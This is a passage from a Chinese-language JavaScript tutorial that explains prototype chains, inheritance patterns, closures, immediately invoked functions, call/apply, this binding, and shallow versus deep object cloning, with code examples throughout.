<p>从测试中可以看出，其实Gra.prototype上面还有原型，这个原型是Object.prototype，Object.prototype上面就没有原型了（null）。</p>
<p>其实，绝大部分对象最终都继承自Object.prototype这个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype);</span><br></pre></td></tr></table></figure>
<p>我们没有自定义原型的对象，它的原型就是Object.prototype。</p>
<p>由此可见，原型链的终点一般是Object.prototype;</p>
<p>但是并不是所有的对象都有原型。</p>
<p>我们可以使用Object.create方法创造没有原型的对象。</p>
<p>Object.create()方法需要写一个参数，这个参数传入的就是这个对象的原型。</p>
<p>如果我们想要构造和var obj = {}一样的对象，就可以这么写：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="built_in">Object</span>.prototype);</span><br></pre></td></tr></table></figure>
<p>我们也可以写一个自定义对象，让它成为原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(&#123; <span class="attr">name</span>: <span class="string">"scarett"</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(obj.name);<span class="comment">//scarlett</span></span><br></pre></td></tr></table></figure>
<p>当我们写参数为null的时候，我们就构造出来了一个没有原型的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<h3 id="原型链上属性的增删改查"><a href="#原型链上属性的增删改查" class="headerlink" title="原型链上属性的增删改查"></a>原型链上属性的增删改查</h3><p>1.新增</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Person.prototype.a = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">person.__proto__.b = <span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>2.删除</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Person.prototype.name = <span class="string">"father"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"son"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">delete</span> person.name;</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//father</span></span><br></pre></td></tr></table></figure>
<p>这个时候person对象上面没有name属性了，我们再次删除这个属性是不是就可以删除原型上的属性了呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> person.name;</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//father</span></span><br></pre></td></tr></table></figure>
<p>实际并没有，由此可见，对象并不能删除原型上的属性。</p>
<p>只有这样才能删除</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> person.__proto__.name</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> Person.prototype.name</span><br></pre></td></tr></table></figure>
<p>3.修改</p>
<p>如果对象的属性只要原型上有，当我们通过一个对象改变了原型上属性的值时，所有对象的这个属性的值也会随之更改。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Person.prototype.arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person();</span><br><span class="line">person1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person2.arr);<span class="comment">//[1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Person.prototype.name = <span class="string">'init'</span>;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//init</span></span><br><span class="line">Person.prototype.name = <span class="string">'person1'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//person1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Person.prototype.name = <span class="string">'init'</span>;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//init</span></span><br><span class="line">person1.__proto__.name = <span class="string">'person1'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);<span class="comment">//person1</span></span><br></pre></td></tr></table></figure>
<p>4.查找</p>
<p>查找我们前面已经介绍过很多了。</p>
<p>最后，我们看个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Person.prototype.name = <span class="string">"scarlett"</span>;</span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"son"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> oPerson = <span class="keyword">new</span> Person();</span><br><span class="line">oPerson.sayName();<span class="comment">//son</span></span><br></pre></td></tr></table></figure>
<p>有一点我们需要记住，谁调用这个方法，这个方法中的this就指向这个调用它的对象，所以打印的是son。</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="1-传统形式"><a href="#1-传统形式" class="headerlink" title="1.传统形式"></a>1.传统形式</h3><p>这个阶段使用的继承方式是我们前面介绍的原型链继承。</p>
<p>但是这种继承有一个缺点就是它会继承过多没有用的属性。</p>
<h3 id="2-借用构造函数"><a href="#2-借用构造函数" class="headerlink" title="2.借用构造函数"></a>2.借用构造函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  Foo.call(<span class="keyword">this</span>, name, age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">"son"</span>, <span class="number">123</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son.name);<span class="comment">//son</span></span><br></pre></td></tr></table></figure>
<p>这种方式就是利用了call和apply可以改变this指向的特点，通过构造函数来间接地构造子对象。</p>
<p>但是这种方式有两个缺点：</p>
<p>1.严格来说，这种方式不属于继承，也访问不了原型的原型。</p>
<p>2.每次构造一个对象都要走两个构造函数，效率很低。</p>
<h3 id="3-共享原型。"><a href="#3-共享原型。" class="headerlink" title="3.共享原型。"></a>3.共享原型。</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Son.prototype = Foo.prototype;</span><br></pre></td></tr></table></figure>
<p>这种方式就是让父子构造函数的原型都一样，虽然这种方法可以让子构造函数访问原型链，也不用走两个构造函数了，但是缺点也很明显：改变了子类的原型，父类原型也会改变，因为它们是同一个。</p>
<h3 id="4-圣杯模式"><a href="#4-圣杯模式" class="headerlink" title="4.圣杯模式"></a>4.圣杯模式</h3><p>这个阶段也是最终阶段，也是我们目前使用的方式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inherit</span>(<span class="params">C, P</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  F.prototype = P.prototype;</span><br><span class="line">  C.prototype = <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们利用了一个中间函数F来连接P和C的原型，这样我们改变C的原型的时候只会影响F而不会影响P。</p>
<p>但是这里还存在一个问题，当我们想查看Child构造出来的对象的构造函数的时候，它打印是Parent函数。</p>
<p>所以我们还需要记录子类的构造函数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">C.prototype.constructor = C;</span><br></pre></td></tr></table></figure></p>
<p>最终的形式就变成了这个样子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inherit</span>(<span class="params">C, P</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  F.prototype = P.prototype;</span><br><span class="line">  C.prototype = <span class="keyword">new</span> F();</span><br><span class="line">  C.prototype.constructor = C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="函数与闭包"><a href="#函数与闭包" class="headerlink" title="函数与闭包"></a>函数与闭包</h2><p>函数声明方式有两种：</p>
<p>1.function demo () {} 函数声明</p>
<p>2.var demo = function () {} 函数表达式</p>
<p>3.var demo = function xxx() {} 命名函数表达式</p>
<p>其实第2种和第3种相比较，第2种叫做匿名函数表达式，我们平时使用第1种和第2种居多，很少使用第3种。</p>
<p>因此第2种我们就简称为函数表达式了（第三种的xxx无法引用函数）。</p>
<p>每一个函数的AO对象里都有一个类数组属性arguments，这个属性里面存的就是实参。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);<span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line">func(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>arguments[0]就可以查看我们传递的第一个实参了。</p>
<p>函数有一个length属性，这个length储存的是实参的数量。</p>
<p>每一个函数都会有一个return，如果不写的话函数也会自动加上一个return;</p>
<p>return的功能有两个：</p>
<p>1.返回这个函数的执行结果。</p>
<p>2.终止函数的执行。</p>
<h3 id="arguments-callee和function-caller"><a href="#arguments-callee和function-caller" class="headerlink" title="arguments.callee和function.caller"></a>arguments.callee和function.caller</h3><p>arguments.callee指代函数本身。</p>
<p>当我们在一些匿名函数或者立即执行函数里面进行递归调用函数本身的时候，由于这个函数没有名字，我们不能用函数名的方式调用，就可以用arguments.callee来调用。</p>
<p>function.caller，这是函数本身自带的一个属性，可以指出当前函运行环境的函数引用，即这个函数是在哪个函数体里面执行的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(test.caller);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  test()</span><br><span class="line">&#125;</span><br><span class="line">demo();<span class="comment">//function demo()&#123;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>定义：变量（变量作用域又称为上下文）和函数生效（能被访问）的区域。</p>
<p>javascript的函数，是可以产生作用域的！</p>
<p>es5中的作用域大概只有全局作用域和函数作用域两种，es6中新添加了块级作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="number">123</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> demo = <span class="number">234</span>;<span class="comment">//局部变量</span></span><br><span class="line">  <span class="built_in">console</span>.log(demo);</span><br><span class="line">&#125;</span><br><span class="line">test();<span class="comment">//234</span></span><br><span class="line"><span class="built_in">console</span>.log(demo1);<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
<p>如果在函数作用域里面声明变量没有用var的话，那么就声明了一个全局变量。</p>
<p>两个不同作用域（除了全局作用域）之间是不能互相访问的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> str1 = <span class="string">"abc"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(str1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo2();<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
<h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><p>既然函数存在函数作用域，函数又可以嵌套，那么作用域之间自然就会产生嵌套关系，这个时候就产生了作用域链。</p>
<p>当代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chain）来保证执行环境变量、函数的有权访问和有序访问。</p>
<p>作用域链的顶层对象始终是当前执行代码所在环境的变量对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> demo_a = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> demo_a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(demo_a);</span><br><span class="line">  &#125;</span><br><span class="line">  test();</span><br><span class="line">&#125;</span><br><span class="line">demo();</span><br></pre></td></tr></table></figure>
<p>在这个例子中，demo运行的时候，首先创建了一个demo的作用域，但是window本身还有一个全局作用域，这就让demo产生了一个作用域链。本着对执行环境的有权和有序访问，每个函数自身的作用域总是在作用域链的最顶层，下一层是这个函数的父级函数的作用域，再下面是父级的父级作用域，直到全局作用域。因此这个例子打印的值是2.</p>
<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>什么是闭包？</p>
<p>闭包是能够读取其他函数内部变量的函数</p>
<p>不同作用域之间是不能够互相访问的，但是我们如果在一个函数内部再定义一个函数，并且这个内部函数与外部函数的变量有关联，那么我们就可以通过返回这个内部函数，然后来访问外部函数里面的变量。</p>
<p>闭包是将函数内部和函数外部连接起来的一座桥梁。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> demo = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    add: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      demo ++;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">get</span>: function() &#123;</span><br><span class="line">      <span class="keyword">return</span> demo;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = func();</span><br><span class="line">obj.add();</span><br><span class="line">obj.add();</span><br><span class="line"><span class="built_in">console</span>.log(obj.get())<span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>当函数执行完之后，函数的执行上下文就会被销毁，我们自然就无法访问里面的变量了。但是我们这个函数返回了一个依赖于这个函数的新函数，也就是说这个没有被销毁的新函数的作用域链中还存在着对原本函数的作用域的引用，就导致我们原本的函数的上下文不会被销毁，我们称返回的这个新函数是原本函数的闭包函数。</p>
<p>在上面的例子中，func函数内部有一个局部变量demo，我们把这个函数的返回值赋值给了一个全局变量obj，但是由于这个返回值中有新函数依赖于本来的func函数，这就导致func函数的上下文不会被销毁。</p>
<p>这里我们一共运行了两次obj.add()，最后打印出来的值是3，说明func函数的a变量在函数执行完之后并没有被销毁而是存到了内存中。</p>
<p>这个里的add函数相当于一个setter累加器，可以在函数外部对函数内部的变量进行操作。</p>
<p>闭包会使得函数中的变量被保存在内存中，所以也不能滥用闭包。</p>
<h2 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h2><p>立即执行函数是处理闭包的一个重要方法。但是注意闭包是没有办法解除的，我们只是通过另一个新闭包来消除上一个闭包的影响。</p>
<p>定义：立即执行函数不需要被定义，直接执行，执行完毕之后直接释放。</p>
<p>经常被用作初始化。</p>
<p>1.(function (a) {})(num);</p>
<p>2.(function (a) {} (num));</p>
<p>传递的形参是a，a的实参值是num，num是我们在外面定义的变量。</p>
<p>这两种写法功能完全一样，但是标准一点的写法是第二种。</p>
<p>函数声明不能被执行，但是函数表达式可以。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;&#125; ();<span class="comment">//错误</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125; ();<span class="comment">//表达式也可以写成立即执行函数的形式。</span></span><br></pre></td></tr></table></figure>
<p>第一种加一个括号变成立即执行函数就可以执行了。</p>
<p>使用立即执行函数处理闭包。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++) &#123;</span><br><span class="line">    arr[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> save = returnB();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++) &#123;</span><br><span class="line">  save[i]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后会输出10个10，并不是我们想要的0-9。</p>
<p>这是因为我们打印i的这一行代码所在的函数的自身作用域中不存在i这个变量，而在它的父级函数returnB中才有i这个变量，而arr[0]-arr[9]这10个值都是闭包函数，当for循环执行完i变成10之后，我们后面依次触发每一个save[i]（arr[0]-arr[9]）函数的时候，函数寻找的i是父级函数returnB作用域中的i，而这个作用域中的i此时已经变成10了。</p>
<p>那么如何更改可以让它输出0-9呢？这里就需要利用立即执行函数来产生新的闭包以消除我们共用一个闭包值导致的问题了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">      arr[n] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(n);</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;(i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> save = returnB();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; save.length; i ++) &#123;</span><br><span class="line">  save[i]()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>立即执行函数执行之后，会产生一个新的作用域，我们把i的具体的0-9这10个数分别作为参数传进去，也就是说每一个作用域里面的的n都是不一样的，所以可以正常打印出0-9。</p>
<h2 id="call-apply"><a href="#call-apply" class="headerlink" title="call/apply"></a>call/apply</h2><p>使用call/apply可以改变this指向。call/apply的区别是传参形式不同。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"scarlett"</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">person();<span class="comment">//window</span></span><br></pre></td></tr></table></figure></p>
<p>此时this打印的是window。</p>
<p>我们尝试使用一下call<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">person.call(obj);<span class="comment">//&#123;name: "scarlett"&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>当使用了call方法之后，person函数内部的this就指向了我们传递的obj对象了。</p>
<p>还需要传参数的话，我们只要把实参值写在call后面并用逗号间隔开就可以了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">person.call(obj, <span class="string">"scarlett"</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj.name);<span class="comment">//scarlett</span></span><br></pre></td></tr></table></figure></p>
<p>apply和call基本没有区别，唯一的区别是call后面的参数是一个一个传的，而apply后面的参数是放在一个数组里然后传进去的。</p>
<p>还是上面那个例子，如果用apply来传递实参的话，将是下面这种形式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">person.apply(obj, [<span class="string">"scarett"</span>, <span class="number">17</span>]);</span><br></pre></td></tr></table></figure></p>
<h2 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h2><p>js中this指向只需要记住这4点</p>
<p>1.预编译过程中 this–&gt;window</p>
<p>2.全局作用域里面 this–&gt;window</p>
<p>3.call/apply可以改变this指向</p>
<p>4.obj.func() func()里面的this指向obj</p>
<p>我们举几个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  height: <span class="number">190</span>,</span><br><span class="line">  eat: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.height++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.eat();<span class="comment">//this指向obj,谁调用的this,this就指向谁。</span></span><br><span class="line">eat.call(obj);<span class="comment">//this指向obj</span></span><br></pre></td></tr></table></figure>
<p>理解了下面这段代码，你就基本能掌握this指向。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"222"</span>;</span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  name: <span class="string">"111"</span>,</span><br><span class="line">  say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = a.say;</span><br><span class="line">fun();<span class="comment">//222</span></span><br><span class="line">a.say();<span class="comment">//111</span></span><br><span class="line"><span class="keyword">var</span> b = &#123;</span><br><span class="line">  name: <span class="string">"333"</span>,</span><br><span class="line">  say: <span class="function"><span class="keyword">function</span>(<span class="params">fun</span>) </span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">b.say(a.say);<span class="comment">//222</span></span><br><span class="line">b.say = a.say;</span><br><span class="line">b.say();<span class="comment">//333</span></span><br></pre></td></tr></table></figure></p>
<p>第一处打印调用fun()，这里其实就是把a.say这个函数的函数体赋给了fun这个函数，相当于在全局空间下写了一个func函数，里面的代码就是a.say里面的代码，所以this指向window，因此打印222。</p>
<p>第二处打印调用了a.say()，按照我们前面说的谁调用函数，函数里面的this就指向谁，因此这里的this指向a，所以打印111。</p>
<p>第三处比较复杂，它调用了b.say(a.say))。这里其实是把a.say这个函数体替换了原本b中fun的位置，我们在调用b.say()这个方法的时候，里面的this是指向b的，但是这个this并不在fun里面而是在say里面,fun里面的this是在预编译阶段指向window的，因此打印222。</p>
<p>第四个b.say = a.say，其实和第二种是一模一样的意思，因此打印333。</p>
<h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><h3 id="克隆的概念"><a href="#克隆的概念" class="headerlink" title="克隆的概念"></a>克隆的概念</h3><p>克隆和我们前面所讲的继承有一些区别，克隆是复制出来一个一模一样的目标对象，克隆分为浅层克隆和深层克隆。</p>
<h3 id="浅层克隆"><a href="#浅层克隆" class="headerlink" title="浅层克隆"></a>浅层克隆</h3><p>大致就是我们的源对象里面有什么属性，目标对象就有什么属性：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">src, tar</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tar = tar || &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> prop <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span>(src.hasOwnProperty(prop)) &#123;</span><br><span class="line">      tar[prop] = src[prop];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当我们有一个属性值是引用值（数组或者对象）的时候，按照这种克隆方式，如果改变了源对象或者目标对象的引用值属性值，另一个也会跟着改变，这一点就是浅层克隆的缺点。</p>
<h3 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h3><p>深层克隆的原理很简单，我们只要不克隆引用值的引用，而是把引用值也当做一个源对象，把里面的值一个一个克隆进目标对象里面就可以了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">src, tar</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tar = tar || &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> prop <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (src.hasOwnProperty(prop)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span>(src[prop]) === <span class="string">"object"</span>) &#123;</span><br><span class="line">        tar[prop] = (src[prop] <span class="keyword">instanceof</span> <span class="built_in">Array</span>) ? [] : &#123;&#125;;</span><br><span class="line">        deepClone(src[prop], tar[prop]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tar[prop] = src[prop];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> tar;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> src = &#123;</span><br><span class="line">  a: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  b: &#123;</span><br><span class="line">    age: <span class="string">"18"</span>,</span><br><span class="line">    sex: <span class="string">"male"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> tar = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> tar1 = deepClone(src, tar);</span><br><span class="line">src.a.push(<span class="number">4</span>);</span><br><span class="line">src.b.name = <span class="string">"jiang"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(src);</span><br><span class="line"><span class="built_in">console</span>.log(tar1)</span><br></pre></td></tr></table></figure></p>
<p>这里我们运用了递归调用的方法，当我们检测到源对象里面的这个属性值是引用类型，那么就在目标对象里面也创建一个引用类型的属性。如果原来是数组就创建数组，是对象就创建对象，然后分别将源对象里面的这个引用值和目标对象里面的引用值分别当做新的源对象和目标对象进行克隆，这样就是克隆的里面每一个值了，而不是把整个引用都克隆过去。</p>
